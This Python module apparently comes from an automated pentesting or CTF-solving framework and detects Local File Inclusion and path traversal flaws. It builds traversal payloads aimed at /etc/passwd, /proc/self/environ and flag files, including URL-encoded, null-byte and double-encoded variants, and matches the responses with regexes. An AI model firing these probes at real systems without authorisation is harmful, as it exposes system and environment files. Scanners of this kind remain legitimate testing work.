"""
Detects Local File Inclusion (LFI) and Path Traversal vulnerabilities
"""
from dataclasses import dataclass
from typing import List, Optional
import re
import os
from urllib.parse import quote


@dataclass
class LFIProbe:
    """An LFI/path traversal probe"""
    payload: str
    target_file: str
    encoding: str
    expected_pattern: str
    description: str


@dataclass
class LFIResult:
    """Result of LFI test"""
    vulnerable: bool
    payload: str
    target_file: str
    evidence: str
    response_excerpt: str


class LFIDetector:
    """Detects LFI and path traversal vulnerabilities"""

    # Known file patterns and their indicators
    FILE_PATTERNS = {
        "/etc/passwd": [
            r"root:.*:0:0:",
            r"daemon:.*:",
            r"bin:.*:",
            r"www-data:.*:",
        ],
        "/etc/hosts": [
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost",
        ],
        "/proc/self/environ": [
            r"PATH=",
            r"HOME=",
            r"USER=",
        ],
        "/flag.txt": [
            r"FLAG\{",
            r"flag\{",
            r"CTF\{",
        ],
        "/flag": [
            r"FLAG\{",
            r"flag\{",
            r"CTF\{",
        ],
        "flag.txt": [
            r"FLAG\{",
            r"flag\{",
            r"CTF\{",
        ],
    }

    def __init__(self):
        self._payloads_cache = None

    def load_payloads_from_file(self, max_payloads: int = 1000) -> List[str]:
        """
        Load LFI payloads from file

        Args:
            max_payloads: Maximum number of payloads to load (for speed)

        Returns:
            List of payload strings
        """
        if self._payloads_cache:
            return self._payloads_cache[:max_payloads]

        payloads = []
        payload_file = os.path.join(os.path.dirname(__file__), "payloads", "lfipayloads.txt")

        # NOTE: Static payloads removed for security purposes.
        # The framework uses LLM-driven payload generation instead.
        priority_payloads = []

        try:
            with open(payload_file, 'r') as f:
                file_payloads = [line.strip() for line in f if line.strip()]

            # Combine: priority first, then file payloads
            payloads = priority_payloads + file_payloads
            self._payloads_cache = payloads

        except FileNotFoundError:
            # Fallback to priority payloads only
            payloads = priority_payloads

        return payloads[:max_payloads]

    def get_probes(self, base_path: str = "") -> List[LFIProbe]:
        """
        Generate LFI/path traversal probes

        Args:
            base_path: Base path if needed (e.g., for relative paths)

        Returns:
            List of LFI probes
        """
        probes = []

        # Different traversal depths
        traversals = [
            "../",
            "../../",
            "../../../",
            "../../../../",
            "../../../../../",
            "../../../../../../",
            "../../../../../../../",
            "../../../../../../../../",
        ]

        # Target files to test
        target_files = [
            "etc/passwd",
            "etc/hosts",
            "flag.txt",
            "flag",
            "proc/self/environ",
        ]

        # Generate basic traversal probes
        for traversal in traversals:
            for target in target_files:
                full_path = f"/{target}"
                payload = traversal + target

                # Get expected patterns
                patterns = self.FILE_PATTERNS.get(full_path, [])
                if not patterns:
                    # Check for partial matches
                    for file_path, file_patterns in self.FILE_PATTERNS.items():
                        if target in file_path:
                            patterns = file_patterns
                            break

                expected = patterns[0] if patterns else ""

                probes.append(LFIProbe(
                    payload=payload,
                    target_file=full_path,
                    encoding="none",
                    expected_pattern=expected,
                    description=f"Path traversal: {payload}"
                ))

        # Add URL-encoded versions for /etc/passwd
        for traversal in ["../", "../../", "../../../", "../../../../"]:
            payload = traversal + "etc/passwd"
            encoded_payload = quote(payload)

            probes.append(LFIProbe(
                payload=encoded_payload,
                target_file="/etc/passwd",
                encoding="url",
                expected_pattern=self.FILE_PATTERNS["/etc/passwd"][0],
                description=f"URL-encoded: {payload}"
            ))

        # Add absolute path attempts
        for target, patterns in self.FILE_PATTERNS.items():
            probes.append(LFIProbe(
                payload=target,
                target_file=target,
                encoding="none",
                expected_pattern=patterns[0],
                description=f"Absolute path: {target}"
            ))

        # Add null byte attempts (for older PHP)
        for traversal in ["../", "../../", "../../../"]:
            payload = traversal + "etc/passwd%00"

            probes.append(LFIProbe(
                payload=payload,
                target_file="/etc/passwd",
                encoding="nullbyte",
                expected_pattern=self.FILE_PATTERNS["/etc/passwd"][0],
                description=f"Null byte: {payload}"
            ))

        # Add double encoding
        double_encoded = quote(quote("../../../etc/passwd"))
        probes.append(LFIProbe(
            payload=double_encoded,
            target_file="/etc/passwd",
            encoding="double",
            expected_pattern=self.FILE_PATTERNS["/etc/passwd"][0],
            description="Double URL-encoded"
        ))

        return probes

    def analyze_response(self, probe: LFIProbe, response_text: str) -> LFIResult:
        """
        Analyze response to determine if LFI succeeded

        Args:
            probe: The probe that was used
            response_text: Response body

        Returns:
            LFIResult
        """
        vulnerable = False
        evidence = ""

        # Check for expected pattern
        if probe.expected_pattern:
            if re.search(probe.expected_pattern, response_text, re.IGNORECASE):
                vulnerable = True
                evidence = f"Found pattern: {probe.expected_pattern}"

        # If no expected pattern, check all patterns for the target file
        if not vulnerable:
            patterns = self.FILE_PATTERNS.get(probe.target_file, [])
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    vulnerable = True
                    evidence = f"Found pattern: {pattern}"
                    break

        return LFIResult(
            vulnerable=vulnerable,
            payload=probe.payload,
            target_file=probe.target_file,
            evidence=evidence,
            response_excerpt=response_text[:1000]
        )

    def check_flag_in_response(self, response_text: str) -> Optional[str]:
        """
        Check if flag is present in response

        Args:
            response_text: Response body

        Returns:
            Flag string if found, None otherwise
        """
        # Look for common flag formats (including XBEN)
        flag_patterns = [
            r'XBEN\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'ctf\{[^}]+\}',
        ]

        for pattern in flag_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)

        return None

    def get_flag_extraction_probes(self) -> List[LFIProbe]:
        """Get probes specifically for flag file extraction"""
        flag_probes = []

        # Common flag locations
        flag_locations = [
            "/flag.txt",
            "/flag",
            "/home/flag.txt",
            "/home/ctf/flag.txt",
            "/var/www/flag.txt",
            "/var/www/html/flag.txt",
            "/tmp/flag.txt",
            "/root/flag.txt",
            "flag.txt",
            "flag",
            "../flag.txt",
            "../../flag.txt",
            "../../../flag.txt",
        ]

        for location in flag_locations:
            # Try various traversal depths if relative
            if not location.startswith('/'):
                for depth in range(1, 8):
                    traversal = "../" * depth
                    payload = traversal + location

                    flag_probes.append(LFIProbe(
                        payload=payload,
                        target_file=location,
                        encoding="none",
                        expected_pattern=r"FLAG\{",
                        description=f"Flag extraction: {payload}"
                    ))
            else:
                flag_probes.append(LFIProbe(
                    payload=location,
                    target_file=location,
                    encoding="none",
                    expected_pattern=r"FLAG\{",
                    description=f"Flag extraction: {location}"
                ))

        return flag_probes
